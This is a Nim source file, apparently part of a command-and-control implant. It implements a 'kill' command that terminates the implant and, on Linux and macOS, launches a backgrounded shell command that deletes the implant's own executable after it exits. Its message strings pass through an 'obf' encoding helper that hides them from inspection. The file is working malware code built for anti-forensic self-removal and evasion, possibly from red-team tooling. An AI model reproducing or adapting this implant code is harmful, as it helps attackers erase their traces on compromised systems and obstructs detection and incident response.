import os, strutils, osproc
import ../../util/strenc

proc kill*(args: seq[string]): string =
    # Kill command - terminate the implant process and attempt self-deletion
    when defined verbose:
        echo obf("Executing kill command - terminating implant")
    
    try:
        # Return success message before terminating
        result = obf("Implant terminating...")
        
        # Attempt self-deletion on Linux/macOS
        when defined(linux) or defined(macosx):
            try:
                # Get current executable path
                let exePath = getAppFilename()
                when defined verbose:
                    echo obf("DEBUG: Attempting self-deletion: ") & exePath
                
                # Execute rm -f in background to delete after process exits
                discard execProcess("nohup sh -c 'sleep 1; rm -f \"" & exePath & "\"' >/dev/null 2>&1 &")
                
                when defined verbose:
                    echo obf("DEBUG: Self-deletion command scheduled")
            except:
                when defined verbose:
                    echo obf("DEBUG: Self-deletion failed, continuing with exit")
        
        # Exit the process immediately
        quit(0)
        
    except:
        let msg = getCurrentExceptionMsg()
        result = obf("ERROR: Failed to terminate implant.\nException: ") & msg
